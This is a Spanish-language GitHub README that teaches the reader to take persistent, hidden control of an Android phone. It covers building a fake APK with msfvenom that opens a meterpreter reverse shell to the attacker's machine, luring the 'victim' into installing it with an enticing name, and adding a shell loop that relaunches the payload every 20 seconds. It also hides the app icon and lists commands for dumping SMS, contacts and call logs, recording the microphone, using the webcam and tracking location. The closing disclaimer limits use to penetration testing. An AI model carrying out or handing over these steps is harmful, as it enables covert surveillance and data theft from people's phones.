# Exploit Persistente
Guía para ejecutar un reverse-shell en un movil android dentro de una misma red local:
* Mediante una sesión meterpreter 



# Requisitos

* [`metasploit-framework`](https://www.metasploit.com/) : Metasploit-Framework (`msfvenom` and `msfconsole`)
* [`python3`](https://www.python.org/) : Python 3.10 or Newer





# Tutorial

## Poner la máquina a escuchar
### Mediante Metasploit-Framework 

Abrimos una terminal y ejecutamos los siguientes comandos:
```
sudo msfconsole
```
Para abrir la consola de Metasploit
```
use multi/handler
```
Seleccionamos para usar el exploit multi handler
```
set payload android/meterpreter/reverse_tcp
```
Seleccionar para usar el payload android/meterpreter/reverse_tcp
```
options
```
Miramos las opciones y los datos que tenemos que rellenar
```
set LHOST xxx.xxx.xxx.xxx
```
Aquí pondremos la dirección IP de la máquina que escuchará
```
set LPORT xxxx
```
Aquí pondremos el puerto de la máquina que escuchará

Una vez relleno todo lo necesario, ejecutar el exploit:
```
run
```

En este punto, tenemos la máquina escuchando y esperando a que la víctima instale y ejecute la aplicación.
![image](https://user-images.githubusercontent.com/128656142/228466667-bbb73a23-d6f6-4184-b848-e03f9b6edf19.png)




## Crear el archivo persistente
### Mediante Nano u otro editor de texto

Abrimos la terminal en la misma ruta que dónde estábamos antes y crearemos un archivo .sh con el siguiente contenido:
```
#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done
```



## Crear la aplicación a instalar
### Mediante msfvenom

Abrir la terminal en la misma ruta donde está creado el archivo persistente .sh y pegar el siguiente comando: 
```
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -o name.apk
```
Este comando, usando msfvenom, crea la aplicación (.apk) falsa que instalaremos en el movil android de la "victima".

* -p android/meterpreter/reverse_tcp : indica el payload que utilizaremos

* LHOST=xxx.xxx.xxx.xxx : indicaremos la direccion IP de la máquina que pondremos a escuchar y hemos puesto arriba

* LPORT=xxxx : indicaremos el puerto de la máquina que pondremos a escuchar y hemos puesto arriba

* -o name.apk : poner un nombre llamativo para la victima para incentivar la instalación 

Después de crear este archivo .apk ya tenemos todo, hay que pasarlo al movil, instalarlo y ejecutarlo.

Para poder pasarlo, una forma rápida puede ser crear un servidor web en la ruta de la carpeta donde hemos creado todos los archivos y desde el movil acceder y descargarlo:
```
python3 -m http.server 80
```
![image](https://user-images.githubusercontent.com/128656142/228477354-f8ca37b9-cfee-47e6-91f3-90001b33e785.png)

Para acceder ponemos la dirección IP de la máquina seguida del puerto que hemos puesto, en el navegador del móvil: 
```
http://xxx.xxx.xxx.xxx:80/
```

# Manipulación

Si todo ha ido bien y la víctima ha ejecutado la aplicacion en el movil android, habrá hecho conexión y nos saldrá el siguiente mensaje:

![image](https://user-images.githubusercontent.com/128656142/228467144-130fe512-aa3f-4838-bb22-5120d45af6ab.png)

Una vez aquí, lo que nos interesa es subir el archivo persistente:
```
upload name.sh
```
![image](https://user-images.githubusercontent.com/128656142/228495366-3a042c1d-cf85-409c-90de-4cb2c00a7b55.png)

Luego ejecutamos los siguientes comandos:
```
shell
```
```
sh name.sh
```       
Con el comando shell ejecutaremos una shell mejor que la de meterpreter y podremos ejecutar el archivo .sh 

![image](https://user-images.githubusercontent.com/128656142/228472084-a1e5eab4-3436-4c90-8000-30a634a411f3.png)

Una vez ejecutado ya lo tenemos corriendo cada 20 segundos, así que si perdemos la conexión solo tendremos que ejecutar el exploit multi/handler y esperar como mucho 20 segundos a que se conecte de nuevo.
        
Un comando muy útil también es: 
```
hide_app_icon
```
Con este comando se oculta la aplicación instalada, ya que el nombre con el que se instala es MainActivity y es dudosa.

**RECORDATORIO:   ESTE ARCHIVO PERSISTENTE SE TERMINA DE EJECUTAR CUANDO SE REINICIE EL MÓVIL DE LA VÍCTIMA, PERO SEGUIRÁ TENIÉNDOLO DESCARGADO. SOLO HAY QUE VOLVER A EJECUTAR LA APLICACIÓN MIENTRAS ESCUCHAMOS CON MULTI/HANDLER.**

**ESTE PASO, SI SE HACE EL COMANDO DE OCULTAR EL ICONO, NO SE PODRÁ HACER YA QUE NO SE VERÁ LA APLICACIÓN.**


# Estos pasos podrían servir para:

-   Ubuntu
-   Linux
-   Kali Linux
-   Fedora
-   Parrot Security OS
-   Windows 10/11
-   Termux (Android)
        
            
        
        
        
# Comandos que se pueden realizar
## Mediante el comando help en meterpreter
        
### Core Commands                          

    Command                     Description
    -------                     -----------
    ?                           Help menu
    background                  Backgrounds the current session
    bg                          Alias for background
    bgkill                      Kills a background meterpreter script
    bglist                      Lists running background scripts
    bgrun                       Executes a meterpreter script as a background thread                  
    channel                     Displays information or control active channels                   
    close                       Closes a channel
    detach                      Detach the meterpreter session (for http/https)                  
    disable_unicode_encoding    Disables encoding of unicode strings
    enable_unicode_encoding     Enables encoding of unicode strings
    exit                        Terminate the meterpreter session
    get_timeouts                Get the current session timeout values
    guid                        Get the session GUID
    help                        Help menu
    info                        Displays information about a Post module
    irb                         Open an interactive Ruby shell on the current session                  
    load                        Load one or more meterpreter extensions
    machine_id                  Get the MSF ID of the machine attached to the session
    pry                         Open the Pry debugger on the current session
    quit                        Terminate the meterpreter session
    read                        Reads data from a channel
    resource                    Run the commands stored in a file
    run                         Executes a meterpreter script or Post module
    secure                      (Re)Negotiate TLV packet encryption on the session                   
    sessions                    Quickly switch to another session
    set_timeouts                Set the current session timeout values
    sleep                       Force Meterpreter to go quiet, then re-establish session                  
    transport                   Manage the transport mechanisms
    use                         Deprecated alias for "load"
    uuid                        Get the UUID for the current session
    write                       Writes data to a channel


### Stdapi: File system Commands

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen                  
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


### Stdapi: Networking Commands

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


### Stdapi: System Commands


    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values                
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as 
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS
                  


### Stdapi: User interface Commands

    Command       Description
    -------       -----------
    screenshare   Watch the remote user desktop in real time             
    screenshot    Grab a screenshot of the interactive desktop
                  


### Stdapi: Webcam Commands

    Command               Description
    -------               -----------
    record_mic            Record audio from the default microphone for X seconds
    webcam_chat           Start a video chat
    webcam_list           List webcams
    webcam_snap           Take a snapshot from the specified webcam
    webcam_stream         Play a video stream from the specified webcam             


### Stdapi: Audio Output Commands

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system
                  

### Android Commands

    Command              Description
    -------              -----------
    activity_start       Start an Android activity from a Uri string
    check_root           Check if device is rooted
    dump_calllog         Get call log
    dump_contacts        Get contacts list
    dump_sms             Get sms messages
    geolocate            Get current lat-long using geolocation
    hide_app_icon        Hide the app icon from the launcher
    interval_colect      Manage interval collection capabilities          
    send_sms             Sends SMS from target session
    set_audio_mode       Set Ringer Mode
    sqlite_query         Query a SQLite database from storage
    wakelock             Enable/Disable Wakelock
    wlan_geolocate       Get current lat-long using WLAN information
   

### Application Controller Commands

    Command              Description
    -------              -----------
    app_install          Request to install apk file
    app_list             List installed apps in the device
    app_run              Start Main Activty for package name
    app_uninstall        Request to uninstall application
    


# Installing Metasploit-Framework 

#### On Linux / macOS :
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
 ```
 
or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos)

or Visit this link : [Click Here](https://www.metasploit.com/download)

#### On Windows :

Visit this link : [Click Here](https://www.metasploit.com/download)

or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#windows-anti-virus-software-flags-the-contents-of-these-packages)


# Disclaimer

* Ni el proyecto ni su desarrollador promueven ningún tipo de actividad ilegal y no son responsables del mal uso o daño causado por este proyecto.
* Este proyecto tiene el único propósito de realizar pruebas de penetración.
* No utilice esta herramienta en los dispositivos de otras personas sin su permiso.
* No use esta herramienta para dañar a otros.
* Use este proyecto de manera responsable solo en sus propios dispositivos.
* Es responsabilidad del usuario final obedecer todas las leyes locales, estatales, federales e internacionales aplicables.



# Developer

<a href="https://github.com/SirChooks/">
  <img style="height:auto;" alt="" src="https://avatars.githubusercontent.com/u/128656142?v=4" width="260" height="260" class="avatar avatar-user width-full border color-bg-default"/>
</a>


**SirChooks** - [@SirChooks](https://github.com/SirChooks/)


